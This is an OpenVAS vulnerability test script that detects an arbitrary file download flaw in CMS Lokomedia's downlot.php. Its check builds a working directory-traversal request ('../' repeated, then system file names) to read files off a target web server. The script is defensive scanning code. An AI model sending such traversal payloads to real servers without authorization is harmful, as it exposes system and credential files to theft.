###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_lokomedia_46915.nasl 3117 2016-04-19 10:19:37Z benallard $
#
# CMS Lokomedia 'downlot.php' Arbitrary File Download Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "CMS Lokomedia is prone to a vulnerability that lets attackers download
arbitrary files. This issue occurs because the application fails to
sufficiently sanitize user-supplied input.

Exploiting this issue will allow an attacker to view arbitrary files
within the context of the application. Information harvested may aid
in launching further attacks.";


if (description)
{
 script_id(103121);
 script_version("$Revision: 3117 $");
 script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:19:37 +0200 (Tue, 19 Apr 2016) $");
 script_tag(name:"creation_date", value:"2011-03-21 13:19:58 +0100 (Mon, 21 Mar 2011)");
 script_bugtraq_id(46915);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("CMS Lokomedia 'downlot.php' Arbitrary File Download Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46915");
 script_xref(name : "URL" , value : "http://bukulokomedia.com/home");

 script_tag(name:"qod_type", value:"remote_vul");
 script_summary("Determine if installed Lokomedia is vulnerable");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

files = traversal_files();

dirs = make_list("/lokomedia",cgi_dirs());

foreach dir (dirs) {
  foreach file (keys(files)) {
   
    url = string(dir, "/downlot.php?file=",crap(data:"../",length:9*9),files[file]); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_message(port:port);
      exit(0);

    }
  }
}
exit(0);
